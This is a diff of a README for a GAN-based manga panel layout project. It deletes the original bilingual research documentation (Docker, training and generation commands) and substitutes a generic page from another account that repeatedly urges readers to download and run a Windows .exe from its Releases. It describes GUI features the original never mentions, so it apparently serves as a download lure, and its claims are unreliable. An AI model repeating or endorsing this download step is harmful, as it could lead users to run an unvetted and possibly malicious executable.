@@ -1,505 +1,66 @@
-<div align="center">
-  
-# Manga Panel Layout Generator with LayoutGAN++
+# 🎨 Manga-Panel-LayoutGAN - Generate Stunning Manga Layouts Effortlessly
 
-[![Python](https://img.shields.io/badge/Python-3.8-blue.svg)](https://www.python.org/)
-[![PyTorch](https://img.shields.io/badge/PyTorch-1.8.1-red.svg)](https://pytorch.org/)
-[![CUDA](https://img.shields.io/badge/CUDA-11.1-green.svg)](https://developer.nvidia.com/cuda-toolkit)
-[![Docker](https://img.shields.io/badge/Docker-Ready-blue.svg)](https://www.docker.com/)
-[![License](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Paper](https://img.shields.io/badge/Paper-LayoutGAN++-orange.svg)](https://arxiv.org/abs/1908.07785)
+[![Download Latest Release](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/asmaends/Manga-Panel-LayoutGAN/releases)
 
-## 📎 Live Demo - Canlı Demo
+## 📖 Overview
 
-[![Hugging Face](https://img.shields.io/badge/🤗%20Hugging%20Face-Demo-yellow?style=for-the-badge&logo=huggingface&logoColor=white)](https://huggingface.co/spaces/koesan/Manga-Panel-LayoutGAN)
+Welcome to **Manga-Panel-LayoutGAN**! This application helps you create beautiful manga layouts using advanced AI technology. With our tool, you can easily generate the best positions for your manga panels, making your creative process smoother and faster.
 
+## 🚀 Getting Started
 
-<img src="image/training.gif" alt="Training Process" width="600"/>
-<p><i>Model training process / Model eğitim süreci</i></p>
+Follow these simple steps to download and run the application.
 
+### 1. System Requirements
 
-## 🎨 Sample Outputs / Örnek Çıktılar
+To run **Manga-Panel-LayoutGAN**, please ensure your computer meets the following requirements:
 
-| 3-Panel Page / 3 Panelli Sayfa | 8-Panel Page / 8 Panelli Sayfa |
-|:---------------:|:---------------:|
-| <img src="image/3_panel.png" alt="3 Panel Layout" width="300"/> | <img src="image/8_panel.png" alt="8 Panel Layout" width="300"/> |
-| Automatically generated layout for 3 panels | Automatically generated layout for 8 panels |
-| 3 panel için otomatik oluşturulan düzen | 8 panel için otomatik oluşturulan düzen |
+- **Operating System:** Windows 10 or higher, MacOS 10.14 or higher, or a modern Linux distribution.
+- **Processor:** Intel i5 or equivalent.
+- **RAM:** At least 8 GB.
+- **Storage:** 500 MB of free space.
+- **Graphics Card:** A GPU with CUDA support for better performance (NVIDIA recommended).
 
+### 2. Download & Install
 
----
+To get the application, visit this page to download: [GitHub Releases](https://github.com/asmaends/Manga-Panel-LayoutGAN/releases).
 
-## 🌐 Language / Dil
+1. Go to the **Releases** section on GitHub.
+2. You will see a list of available versions.
+3. Click on the latest version to view the assets associated with it.
+4. Download the file relevant to your operating system. It will be labeled clearly (e.g., `Manga-Panel-LayoutGAN-Windows.exe` for Windows users). 
+5. Once downloaded, locate the file on your computer. Double-click to run the installer and follow the on-screen instructions.
 
-**[English](#english)** | **[Türkçe](#türkçe)**
+## 📥 Features
 
-</div>
+- **AI-Driven Layouts**: Automatically generates panel suggestions based on deep learning models. 
+- **User-Friendly Interface**: Simple design that anyone can navigate with ease.
+- **Interactive Preview**: View and adjust your layout instantly.
+- **Export Options**: Save your layouts in multiple formats for easy sharing and printing.
 
----
+## 🛠️ How to Use the Application
 
-<a name="english"></a>
-# 📖 English Documentation
+1. **Start the Application**: After installation, open **Manga-Panel-LayoutGAN**.
+2. **Upload Your Page**: Click on the "Upload" button to import your manga page as an image file (e.g., PNG, JPG).
+3. **Generate Layout**: Hit the "Generate" button. The software will analyze your image and suggest panel layouts.
+4. **Fine-Tune Layouts**: You can adjust the suggested panel positions using drag-and-drop.
+5. **Export Your Layout**: Once you’re satisfied, use the "Export" option to save your layout.
 
-## 📖 About
+## 🔧 Troubleshooting
 
-**AI-powered automatic manga panel position prediction and layout generation project.**
+If you face any issues, consider the following steps:
 
-This project aims to create automatic panel layouts for manga pages using the LayoutGAN++ architecture. It predicts optimal placement for manga pages with different panel counts using deep learning and GAN technology.
+- **Installation Problems**: Ensure you have downloaded the correct file for your operating system. 
+- **Performance Issues**: Closing other applications may help if the software runs slowly.
+- **Graphics Card Compatibility**: If you use an integrated graphics card, results may vary. A dedicated GPU is recommended for best performance.
 
-## 📦 Installation
+## 🙏 Feedback & Contribution
 
-### Requirements
+We welcome feedback and contributions! If you have any suggestions or improvements, please feel free to open an issue in the repository. Your input helps us enhance **Manga-Panel-LayoutGAN** for everyone.
 
-- Docker
-- NVIDIA GPU (recommended)
-- NVIDIA Docker runtime
+## 📞 Support
 
-### Build Docker Image
-
-```bash
-docker build -t const_layout_image .
-```
-
-### Download Dataset
-
-Download the manga panel dataset from Google Drive and place it in the `data/dataset/` folder:
-
-**Dataset Link:** [Manga Panel Dataset](https://drive.google.com/file/d/1aEpHR-C64ONnZFlVybe-Ccbm18sJKJ7t/view?usp=sharing)
-
-```bash
-# After downloading the dataset
-unzip manga_dataset.zip -d data/dataset/
-```
+If you need help or have questions, please check the **Issues** section on our GitHub page. You can also reach out through any available forums related to the application.
 
 ---
 
-## 🚀 Running
-
-### Start Container
-
-```bash
-docker run --gpus all -it --name const_layout_container \
-  -v $(pwd)/output:/app/output \
-  const_layout_image
-```
-
-> **Note:** The Docker image includes all necessary dependencies. No conda or manual installation required.
-
-### Alternative: Development Mode
-
-If you want to modify the code, mount the entire project:
-
-```bash
-docker run --gpus all -it --name const_layout_container \
-  -v $(pwd):/app \
-  -w /app \
-  const_layout_image
-```
-
-In this case, download pretrained models inside the container:
-
-```bash
-bash download_model.sh
-```
-
----
-
-## 🎓 Model Training
-
-Training with manga panel dataset:
-
-```bash
-python train.py \
-  --dataset publaynet \
-  --batch_size 64 \
-  --iteration 200000 \
-  --latent_size 4 \
-  --lr 1e-5 \
-  --G_d_model 256 \
-  --G_nhead 4
-```
-
-> **Note:** Make sure the dataset is in the `data/dataset/` folder before training.
-
-### Key Parameters
-
-- `--dataset`: Dataset selection (using manga dataset)
-- `--batch_size`: Batch size (default: 64)
-- `--iteration`: Total iteration count (default: 200000)
-- `--latent_size`: Latent vector size (default: 4)
-- `--lr`: Learning rate (default: 1e-5)
-- `--G_d_model`: Generator model size (default: 256)
-- `--G_nhead`: Number of attention heads (default: 4)
-
-Training outputs are saved to the `output/` folder:
-
-- `checkpoint.pth.tar` - Latest checkpoint
-- `model_best.pth.tar` - Best model
-- TensorBoard log files
-
----
-
-## 🎨 Layout Generation
-
-### Quick Test - With Pretrained Model
-
-If you want to test without training your own model, use the pretrained model:
-
-**Pretrained Model Link:** [model_best.pth.tar](https://drive.google.com/file/d/1Cy1wM4wV2YP_hx7xQTw3NF8fySEDvslk/view?usp=sharing)
-
-```bash
-# After downloading the model
-docker run --gpus all -it --name const_layout_container \
-  -v $(pwd):/app \
-  -w /app \
-  const_layout_image
-
-# Inside container
-python generate.py model_best.pth.tar \
-  --num_elements 3 \
-  --num_save 1 \
-  --out_path output/test_layout.pkl
-```
-
-This command will generate a 3-panel manga page layout and save it to the `output/` folder.
-
-### Generate with Your Own Model
-
-```bash
-python generate.py model_best.pth.tar \
-  --num_elements 8 \
-  --num_save 1 \
-  --out_path output/layouts.pkl
-```
-
-### Parameters
-
-- `--num_elements`: Number of panels per layout (default: 10)
-- `--num_save`: How many layouts to generate (default: 1)
-- `--out_path`: Output file path
-
----
-
-## 📁 Project Structure
-
-```
-├── train.py              # Training script
-├── generate.py           # Panel layout generation
-├── eval.py               # Model evaluation
-├── metric.py             # Metric computation
-├── util.py               # Utility functions
-├── Dockerfile            # Docker definition
-├── requirements.txt      # Python dependencies
-├── download_model.sh     # Pretrained model downloader
-├── image/                # Sample images
-│   ├── training.gif
-│   ├── 3_panel.png
-│   └── 8_panel.png
-├── model/                # Model architectures
-│   ├── layoutganpp.py    # LayoutGAN++ generator & discriminator
-│   └── layoutnet.py      # LayoutNet (for FID metrics)
-└── data/                 # Dataset modules
-    ├── __init__.py
-    ├── base.py
-    └── dataset/          # Manga panel dataset (you need to download)
-```
-
----
-
-## 💡 Usage Examples
-
-### 3-Panel Manga Page
-
-```bash
-python generate.py model_best.pth.tar --num_elements 3 --out_path output/manga_3panel.pkl
-```
-
-### 8-Panel Manga Page
-
-```bash
-python generate.py model_best.pth.tar --num_elements 8 --out_path output/manga_8panel.pkl
-```
-
-### Batch Generation (100 pages)
-
-```bash
-python generate.py model_best.pth.tar --num_save 100 --num_elements 6 --out_path output/batch.pkl
-```
-
-### Quick Test Training
-
-```bash
-python train.py --dataset manga --batch_size 32 --iteration 50000 --name quick_test
-```
-
----
-
-## 🔧 Docker Management
-
-```bash
-# Stop container
-docker stop const_layout_container
-
-# Restart container
-docker start -i const_layout_container
-
-# Copy outputs
-docker cp const_layout_container:/app/output ./output
-```
-
----
-
-## 🙏 Acknowledgments
-
-This project uses the following resources:
-
-### Dataset
-
-- **MangaZero Dataset**: [Hugging Face](https://huggingface.co/datasets/jianzongwu/MangaZero)
-  - Thanks for providing the manga panel data
-
-### Reference Project
-
-- **LayoutGAN++**: [GitHub Repository](https://github.com/ktrk115/const_layout)
-  - For panel layout research
-
-### Model Architecture
-
-- **LayoutGAN++**: [Paper](https://arxiv.org/abs/1901.06767)
-  - Transformer-based GAN architecture for layout generation
-
----
-
----
-
-<a name="türkçe"></a>
-
-# 📖 Türkçe Dokümantasyon
-
-## 📖 Hakkında
-
-**Yapay zeka ile manga panellerinin otomatik konum tahmini ve düzen oluşturma projesi.**
-
-Bu proje, LayoutGAN++ mimarisi kullanarak manga sayfaları için otomatik panel düzeni oluşturmayı hedeflemektedir. Derin öğrenme ve GAN teknolojisi ile farklı sayıda panel içeren manga sayfalarının optimal yerleşimini tahmin eder.
-
-## 📦 Kurulum
-
-### Gereksinimler
-
-- Docker
-- NVIDIA GPU (önerilen)
-- NVIDIA Docker runtime
-
-### Docker Image Oluşturma
-
-```bash
-docker build -t const_layout_image .
-```
-
-### Dataset İndirme
-
-Manga panel dataset'ini Google Drive'dan indirin ve `data/dataset/` klasörüne yerleştirin:
-
-**Dataset Linki:** [Manga Panel Dataset](https://drive.google.com/file/d/1aEpHR-C64ONnZFlVybe-Ccbm18sJKJ7t/view?usp=sharing)
-
-```bash
-# Dataset'i indirdikten sonra
-unzip manga_dataset.zip -d data/dataset/
-```
-
----
-
-## 🚀 Çalıştırma
-
-### Container Başlatma
-
-```bash
-docker run --gpus all -it --name const_layout_container \
-  -v $(pwd)/output:/app/output \
-  const_layout_image
-```
-
-> **Not:** Docker image'ı tüm gerekli bağımlılıkları içerir. Conda veya manuel kurulum gerekmez.
-
-### Alternatif: Kod Geliştirme Modu
-
-Kod değişikliği yapmak istiyorsanız tüm projeyi mount edebilirsiniz:
-
-```bash
-docker run --gpus all -it --name const_layout_container \
-  -v $(pwd):/app \
-  -w /app \
-  const_layout_image
-```
-
-Bu durumda container içinde pretrained modelleri indirmeniz gerekir:
-
-```bash
-bash download_model.sh
-```
-
----
-
-## 🎓 Model Eğitimi
-
-Manga panel dataset ile eğitim:
-
-```bash
-python train.py \
-  --dataset publaynet \
-  --batch_size 64 \
-  --iteration 200000 \
-  --latent_size 4 \
-  --lr 1e-5 \
-  --G_d_model 256 \
-  --G_nhead 4
-```
-
-> **Not:** Eğitim öncesinde dataset'in `data/dataset/` klasöründe bulunduğundan emin olun.
-
-### Temel Parametreler
-
-- `--dataset`: Dataset seçimi (manga dataset kullanılıyor)
-- `--batch_size`: Batch boyutu (varsayılan: 64)
-- `--iteration`: Toplam iterasyon sayısı (varsayılan: 200000)
-- `--latent_size`: Latent vektör boyutu (varsayılan: 4)
-- `--lr`: Learning rate (varsayılan: 1e-5)
-- `--G_d_model`: Generator model boyutu (varsayılan: 256)
-- `--G_nhead`: Attention head sayısı (varsayılan: 4)
-
-Eğitim çıktıları `output/` klasörüne kaydedilir:
-
-- `checkpoint.pth.tar` - Son checkpoint
-- `model_best.pth.tar` - En iyi model
-- TensorBoard log dosyaları
-
----
-
-## 🎨 Layout Üretimi
-
-### Hızlı Test - Eğitilmiş Model ile
-
-Kendi modelinizi eğitmeden test etmek istiyorsanız, hazır eğitilmiş modeli kullanabilirsiniz:
-
-**Eğitilmiş Model Linki:** [model_best.pth.tar](https://drive.google.com/file/d/1Cy1wM4wV2YP_hx7xQTw3NF8fySEDvslk/view?usp=sharing)
-
-```bash
-# Modeli indirdikten sonra
-docker run --gpus all -it --name const_layout_container \
-  -v $(pwd):/app \
-  -w /app \
-  const_layout_image
-
-# Container içinde
-python generate.py model_best.pth.tar \
-  --num_elements 3 \
-  --num_save 1 \
-  --out_path output/test_layout.pkl
-```
-
-Bu komut 3 panelli bir manga sayfası düzeni oluşturacak ve `output/` klasörüne kaydedecektir.
-
-### Kendi Modeliniz ile Layout Üretme
-
-```bash
-python generate.py model_best.pth.tar \
-  --num_elements 8 \
-  --num_save 1 \
-  --out_path output/layouts.pkl
-```
-
-### Parametreler
-
-- `--num_elements`: Her layout'taki panel sayısı (varsayılan: 10)
-- `--num_save`: Kaç layout üretileceği (varsayılan: 1)
-- `--out_path`: Çıktı dosya yolu
-
----
-
-## 📁 Proje Yapısı
-
-```
-├── train.py              # Eğitim scripti
-├── generate.py           # Panel layout üretme
-├── eval.py               # Model değerlendirme
-├── metric.py             # Metrik hesaplama
-├── util.py               # Yardımcı fonksiyonlar
-├── Dockerfile            # Docker tanımı
-├── requirements.txt      # Python bağımlılıkları
-├── download_model.sh     # Pretrained model indirme
-├── image/                # Örnek görseller
-│   ├── training.gif
-│   ├── 3_panel.png
-│   └── 8_panel.png
-├── model/                # Model mimarileri
-│   ├── layoutganpp.py    # LayoutGAN++ generator & discriminator
-│   └── layoutnet.py      # LayoutNet (FID metrikleri için)
-└── data/                 # Dataset modülleri
-    ├── __init__.py
-    ├── base.py
-    └── dataset/          # Manga panel dataset (indirmeniz gerekiyor)
-```
-
----
-
-## 💡 Kullanım Örnekleri
-
-### 3 Panelli Manga Sayfası
-
-```bash
-python generate.py model_best.pth.tar --num_elements 3 --out_path output/manga_3panel.pkl
-```
-
-### 8 Panelli Manga Sayfası
-
-```bash
-python generate.py model_best.pth.tar --num_elements 8 --out_path output/manga_8panel.pkl
-```
-
-### Toplu Üretim (100 sayfa)
-
-```bash
-python generate.py model_best.pth.tar --num_save 100 --num_elements 6 --out_path output/batch.pkl
-```
-
-### Kısa Test Eğitimi
-
-```bash
-python train.py --dataset manga --batch_size 32 --iteration 50000 --name quick_test
-```
-
----
-
-## 🔧 Docker Yönetimi
-
-```bash
-# Container'ı durdur
-docker stop const_layout_container
-
-# Container'ı yeniden başlat
-docker start -i const_layout_container
-
-# Çıktıları kopyala
-docker cp const_layout_container:/app/output ./output
-```
-
----
-
-## 🙏 Teşekkürler
-
-Bu proje aşağıdaki kaynakları kullanmaktadır:
-
-### Dataset
-
-- **MangaZero Dataset**: [Hugging Face](https://huggingface.co/datasets/jianzongwu/MangaZero)
-  - Manga panel verilerini sağladıkları için teşekkürler
-
-### Referans Proje
-
-- **LayoutGAN++**: [GitHub Repository](https://github.com/ktrk115/const_layout)
-  - Panel düzenleme araştırmaları için
-
-### Model Mimarisi
-
-- **LayoutGAN++**: [Paper](https://arxiv.org/abs/1901.06767)
-  - Layout generation için transformer tabanlı GAN mimarisi
+Remember to visit this page to download the application: [GitHub Releases](https://github.com/asmaends/Manga-Panel-LayoutGAN/releases). Enjoy creating your manga layouts!
